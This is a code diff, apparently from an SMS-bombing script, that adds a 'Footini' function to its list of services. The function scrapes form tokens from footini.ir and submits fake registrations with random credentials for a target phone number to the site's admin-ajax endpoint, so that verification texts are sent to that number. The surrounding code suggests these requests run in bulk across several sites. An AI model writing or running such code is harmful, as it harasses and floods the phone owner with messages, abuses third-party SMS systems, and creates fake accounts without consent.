@@ -63,6 +63,95 @@ def send_service_safe(service, phone):
 # توابع سرویس‌ها
 # ==========================
 
+
+
+def Footini(phone):
+    try:
+        session = requests.Session()
+        
+        # دریافت صفحه اصلی برای استخراج instance_id و digits_form
+        home_response = session.get(
+            "https://footini.ir/product-category/sandal/?login=true&page=1",
+            headers={"User-Agent": random.choice(user_agents)},
+            timeout=10
+        )
+        
+        # استخراج instance_id و digits_form از صفحه
+        instance_id_match = re.search(r'name="instance_id" value="([^"]+)"', home_response.text)
+        digits_form_match = re.search(r'name="digits_form" value="([^"]+)"', home_response.text)
+        
+        instance_id = instance_id_match.group(1) if instance_id_match else "de6bca2e4448c81c7733fa67a04f5594"
+        digits_form = digits_form_match.group(1) if digits_form_match else "09819c58fd"
+        
+        print(f'{g}[+] Instance ID: {instance_id}, Digits Form: {digits_form}{a}')
+        
+        # آماده سازی payload
+        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
+        
+        payload = {
+            "digt_countrycode": "+98",
+            "phone": formatted_phone,
+            "digits_reg_name": "نام",
+            "digits_reg_username": f"user{random.randint(10000, 99999)}",
+            "digits_reg_password": f"Pass{random.randint(1000, 9999)}",
+            "digits_process_register": "1",
+            "sms_otp": "",
+            "otp_step_1": "1",
+            "digits_otp_field": "1",
+            "instance_id": instance_id,
+            "optional_data": "optional_data",
+            "action": "digits_forms_ajax",
+            "type": "register",
+            "dig_otp": "otp",
+            "digits": "1",
+            "digits_redirect_page": "https://footini.ir/product-category/sandal/",
+            "digits_form": digits_form,
+            "_wp_http_referer": "/product-category/sandal/?login=true&page=1",
+            "container": "digits_protected",
+            "sub_action": "sms_otp"
+        }
+        
+        headers = {
+            "User-Agent": random.choice(user_agents),
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "Accept": "*/*",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://footini.ir",
+            "Referer": "https://footini.ir/product-category/sandal/?login=true&page=1",
+        }
+        
+        response = session.post(
+            "https://footini.ir/wp-admin/admin-ajax.php",
+            data=payload,
+            headers=headers,
+            timeout=10
+        )
+        
+        print(f'{y}[Debug] Footini Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Footini Response: {response.text}{a}')
+        
+        if response.status_code == 200:
+            try:
+                data = response.json()
+                if data.get("success") or "otp" in str(data).lower():
+                    print(f'{g}(Footini) Code Sent{a}')
+                    return True
+            except:
+                if "1" in response.text or "success" in response.text.lower():
+                    print(f'{g}(Footini) Code Sent{a}')
+                    return True
+        elif response.status_code == 400:
+            print(f'{r}[-] Footini Bad Request{a}')
+            return False
+        
+        return False
+            
+    except Exception as e:
+        print(f'{r}[!] Footini Exception: {e}{a}')
+        return False
+
+
+
 def ShahreSandal(phone):
     try:
         session = requests.Session()
@@ -317,7 +406,7 @@ def nillarayeshi(phone):
 # ==========================
 # لیست سرویس‌ها
 # ==========================
-services = [SibApp, ShahreSandal, Balad, nillarayeshi]
+services = [SibApp, ShahreSandal, Footini, Balad, nillarayeshi]
 
 # ==========================
 # تابع VIP مولتی‌تردینگ
